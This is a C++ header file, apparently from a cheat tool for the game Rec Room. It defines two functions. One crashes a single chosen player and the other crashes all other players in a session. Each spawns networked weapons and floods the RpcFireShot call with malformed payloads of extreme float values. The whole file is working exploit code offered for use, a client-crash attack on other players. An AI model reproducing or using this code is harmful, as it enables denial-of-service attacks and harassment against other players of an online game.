#pragma once

namespace Callbacks
{
	std::chrono::steady_clock::time_point lastBulletCrashExecutionTime = std::chrono::steady_clock::time_point::clock::now();

	bool BulletCrashTarget(PhotonPlayer* targetPP) {
		
		if (const auto now = std::chrono::steady_clock::now();
			std::chrono::duration_cast<std::chrono::milliseconds>(now - lastBulletCrashExecutionTime).count() >= globals::bulletCrashRateLimit) {
			
			std::unique_lock lock(playerlistMutex, std::defer_lock);
			if (lock.try_lock_for(std::chrono::milliseconds(globals::playerlistMutexTimeout))) {

				if (localPlayerExists && localPlayer.loadingStage >= LoadingStage::RECROOM)
				{
					if (!cachedPlayerlist.contains(targetPP))
					{
						lock.unlock();
						return false;
					}
					
					if (GameObject* shotgunObject = PhotonNetwork::photonInstantiate(WriteIl2CppString("[QuEsT_dRaCuLa1_BlUnDeRbUsS]"), {0, -1000, 0}, {0, 0, 0}, {1, 1, 1}, 0, nullptr, true)) {
						if (Component* rangedWeaponComponent = shotgunObject->GetComponent("RecRoom.Core.Combat.RangedWeapon")) {

							constexpr float maxx = 99999993215964691371151521984339247104.000f;
							constexpr float minn = -99999993215964691371151521984339247104.000f;

							Vector3 position = { maxx, minn, minn };
							Quaternion rotation = { maxx, minn, maxx, minn };
							Vector3 velocity = { maxx, minn, minn };

							std::vector<PhotonView::PayloadEntry> payloadVector = {
								{position,			"UnityEngine.Vector3"},		// position
								{rotation,			"UnityEngine.Quaternion"},	// rotation
								{velocity,			"UnityEngine.Vector3"},		// velocity
								{100.0f,			"System.Single"},			// chargeAmount
								{false,				"System.Boolean"},			// misFire
								{(uint8_t)42069,	"System.Byte"}				// shotId
							};

							Il2CppArray* payloadArray = PhotonView::CreateRPCPayloadArray(payloadVector);
					
							if (auto* rangedWeaponMonoBehaviourPun = (MonoBehaviourPun*)rangedWeaponComponent)
							{
								if (PhotonView* photonView = rangedWeaponMonoBehaviourPun->get_PhotonView()) {

									for (int i = 0; i < globals::crashes::bulletCrash::blunderBussCount; i++)
									{
										photonView->SendRPC("RpcFireShot", targetPP, payloadArray);
									}
								}
							}
						}
					}

					if (GameObject* wandObject = PhotonNetwork::photonInstantiate(WriteIl2CppString("[QuEsT_gObLiN_wAnD]"), {0, -1000, 0}, {0, 0, 0}, {1, 1, 1}, 0, nullptr, true)) {
						if (Component* rangedWeaponComponent = wandObject->GetComponent("RecRoom.Core.Combat.RangedWeapon")) {

							constexpr float maxx = 99999993215964691371151521984339247104.000f;
							constexpr float minn = -99999993215964691371151521984339247104.000f;

							Vector3 position = { minn, minn, maxx };
							Quaternion rotation = { minn, maxx, minn, maxx };
							Vector3 velocity = { minn, maxx, maxx };

							std::vector<PhotonView::PayloadEntry> payloadVector = {
								{position,			"UnityEngine.Vector3"},		// position
								{rotation,			"UnityEngine.Quaternion"},	// rotation
								{velocity,			"UnityEngine.Vector3"},		// velocity
								{100.0f,			"System.Single"},			// chargeAmount
								{false,				"System.Boolean"},			// misFire
								{(uint8_t)69420,	"System.Byte"}				// shotId
							};

							Il2CppArray* payloadArray = PhotonView::CreateRPCPayloadArray(payloadVector);
					
							if (auto* rangedWeaponMonoBehaviourPun = (MonoBehaviourPun*)rangedWeaponComponent)
							{
								if (PhotonView* photonView = rangedWeaponMonoBehaviourPun->get_PhotonView()) {

									for (int i = 0; i < globals::crashes::bulletCrash::wandCount; i++)
									{
										photonView->SendRPC("RpcFireShot", targetPP, payloadArray);
									}
								}
							}
						}
					}

					lastBulletCrashExecutionTime = now; // Update the last execution time
				}
				
				lock.unlock();
			}
			else {
				Log::error("playerlistMutex timed out in BulletCrashTarget!");
				return false;
			}
		}
		else {
			Log::error("[RAM-Crash] Rate Limit in effect!");
			return false;
		}

		return true;
	}

	bool BulletCrashAll() {
		
		if (const auto now = std::chrono::steady_clock::now();
			std::chrono::duration_cast<std::chrono::milliseconds>(now - lastBulletCrashExecutionTime).count() >= globals::bulletCrashRateLimit) {
			
			std::unique_lock lock(playerlistMutex, std::defer_lock);
			if (lock.try_lock_for(std::chrono::milliseconds(globals::playerlistMutexTimeout))) {

				if (localPlayerExists && localPlayer.loadingStage >= LoadingStage::RECROOM)
				{
					
					if (GameObject* shotgunObject = PhotonNetwork::photonInstantiate(WriteIl2CppString("[QuEsT_dRaCuLa1_BlUnDeRbUsS]"), {0, -1000, 0}, {0, 0, 0}, {1, 1, 1}, 0, nullptr, true)) {
						if (Component* rangedWeaponComponent = shotgunObject->GetComponent("RecRoom.Core.Combat.RangedWeapon")) {

							constexpr float maxx = 99999993215964691371151521984339247104.000f;
							constexpr float minn = -99999993215964691371151521984339247104.000f;

							Vector3 position = { maxx, minn, minn };
							Quaternion rotation = { maxx, minn, maxx, minn };
							Vector3 velocity = { maxx, minn, minn };

							std::vector<PhotonView::PayloadEntry> payloadVector = {
								{position,			"UnityEngine.Vector3"},		// position
								{rotation,			"UnityEngine.Quaternion"},	// rotation
								{velocity,			"UnityEngine.Vector3"},		// velocity
								{100.0f,			"System.Single"},			// chargeAmount
								{false,				"System.Boolean"},			// misFire
								{(uint8_t)42069,	"System.Byte"}				// shotId
							};

							Il2CppArray* payloadArray = PhotonView::CreateRPCPayloadArray(payloadVector);
					
							if (auto* rangedWeaponMonoBehaviourPun = (MonoBehaviourPun*)rangedWeaponComponent)
							{
								if (PhotonView* photonView = rangedWeaponMonoBehaviourPun->get_PhotonView()) {

									for (int i = 0; i < globals::crashes::bulletCrash::blunderBussCount; i++)
									{
										photonView->SendRPC("RpcFireShot", Others, payloadArray);
									}
								}
							}
						}
					}

					if (GameObject* wandObject = PhotonNetwork::photonInstantiate(WriteIl2CppString("[QuEsT_gObLiN_wAnD]"), {0, -1000, 0}, {0, 0, 0}, {1, 1, 1}, 0, nullptr, true)) {
						if (Component* rangedWeaponComponent = wandObject->GetComponent("RecRoom.Core.Combat.RangedWeapon")) {

							constexpr float maxx = 99999993215964691371151521984339247104.000f;
							constexpr float minn = -99999993215964691371151521984339247104.000f;

							Vector3 position = { minn, minn, maxx };
							Quaternion rotation = { minn, maxx, minn, maxx };
							Vector3 velocity = { minn, maxx, maxx };

							std::vector<PhotonView::PayloadEntry> payloadVector = {
								{position,			"UnityEngine.Vector3"},		// position
								{rotation,			"UnityEngine.Quaternion"},	// rotation
								{velocity,			"UnityEngine.Vector3"},		// velocity
								{100.0f,			"System.Single"},			// chargeAmount
								{false,				"System.Boolean"},			// misFire
								{(uint8_t)69420,	"System.Byte"}				// shotId
							};

							Il2CppArray* payloadArray = PhotonView::CreateRPCPayloadArray(payloadVector);
					
							if (auto* rangedWeaponMonoBehaviourPun = (MonoBehaviourPun*)rangedWeaponComponent)
							{
								if (PhotonView* photonView = rangedWeaponMonoBehaviourPun->get_PhotonView()) {

									for (int i = 0; i < globals::crashes::bulletCrash::wandCount; i++)
									{
										photonView->SendRPC("RpcFireShot", Others, payloadArray);
									}
								}
							}
						}
					}

					lastBulletCrashExecutionTime = now; // Update the last execution time
				}
				
				lock.unlock();
			}
			else {
				Log::error("playerlistMutex timed out in BulletCrashAll!");
				return false;
			}
		}
		else {
			Log::error("[RAM-Crash] Rate Limit in effect!");
			return false;
		}

		return true;
	}
}